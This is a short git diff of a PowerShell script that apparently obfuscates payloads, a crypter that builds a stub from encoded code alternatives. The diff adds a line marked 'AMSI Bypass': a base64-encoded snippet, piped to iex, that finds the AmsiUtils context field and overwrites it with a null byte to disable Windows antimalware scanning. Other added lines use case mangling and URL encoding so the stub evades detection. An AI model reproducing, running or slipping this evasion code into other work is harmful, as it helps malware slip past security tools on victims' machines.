@@ -159,16 +159,18 @@ sleep 1
             # write
             Write-Host "[*] Obfuscating Layers ..."
 
-            # Added Support for Unicode, URL and HTML Decoding
+            # Added Support for Unicode, URL and HTML Decoding 22/08/2022
+			# ADDED AMSI Bypass 11/1/2022
 
             $stub_template = ''
 
             $code_alternatives  = @()
-			 $code_alternatives += '([REGex]::uNesCapE("\u0041\u0064\u0064\u002d\u0054\u0079\u0070\u0065\u0020\u002d\u0041\u0073\u0073\u0065\u006d\u0062\u006c\u0079\u004e\u0061\u006d\u0065\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0057\u0065\u0062\u0020\u003e\u0020\u0024\u006e\u0075\u006c\u006c")) | iEx' + "`r`n"
+			$code_alternatives += '([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Zm9yZWFjaCgkaSBpbiBbUmVmXS5Bc3NlbWJseS5HZXRUeXBlcygpKXtpZigkaS5OYW1lIC1saWtlICIqc2lVIisiKiIrImlscyIpeyR1dGlsRnVuY3Rpb25zPSRpLkdldEZpZWxkcygnTm9uUHVibGljLFN0YXRpYycpfX07CiRtb3JlY29kZT0iYXNkYWdnd3J3YWdyd3dlZmVhZ3dnIgpmb3JlYWNoKCRmdW5jIGluICR1dGlsRnVuY3Rpb25zKXtpZigkZnVuYy5OYW1lIC1saWtlICIqQ29udGV4dCIpeyRhZGRyPSRmdW5jLkdldFZhbHVlKCRudWxsKX19OwokZGVhZGMwZGU9NDUxMjM0MTIzNTEyMzE1MjM1NjMyMzQ1CltJbnRwdHJdJHBvaW50ZXI9JGFkZHI7CiRkZWFkYjMzZj0ic3RyaW5nMTIzNDIzNDUzMTIzNSIKW0ludDMyW11dJG51bGxCeXRlPUAoMCk7CltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJG51bGxCeXRlLDAsJHBvaW50ZXIsMSk7")))|iex' + "`r`n"
+			$code_alternatives += 'aDd-tYpe -assEmBLyNAmE sYstEm.wEb > $nULl | Iex' + "`r`n"
             $code_alternatives += '${2} = [coNVeRT]::fROmbASE64sTRINg("{0}")' + "`r`n"       			
-		   $code_alternatives += '${2} = [coNVeRT]::fROmbASE64sTRINg("{0}")' + "`r`n"
+		    $code_alternatives += '${2} = [coNVeRT]::fROmbASE64sTRINg("{0}")' + "`r`n"
             $code_alternatives += '${3} = [coNVeRT]::fRomBaSE64sTRINg("{1}")' + "`r`n"
-            $code_alternatives += '${4} = [SyStEm.NEt.WebUtIlIty]::HTmlDecOdE("&#x4e;&#x65;&#x77;&#x2d;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2e;&#x43;&#x72;&#x79;&#x70;&#x74;&#x6f;&#x67;&#x72;&#x61;&#x70;&#x68;&#x79;&#x2e;&#x41;&#x65;&#x73;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x64;&#x22;") | iex' + "`r`n"
+            $code_alternatives += '${4} = ([SYSTeM.web.httpUTiLIty]::urLdEcOdE("New%2DObject%20%22System%2ESecurity%2ECryptography%2EAesManaged%22%20"))|iex' + "`r`n"
             $code_alternatives_shuffled = $code_alternatives 
             $stub_template += $code_alternatives_shuffled -join ''
            
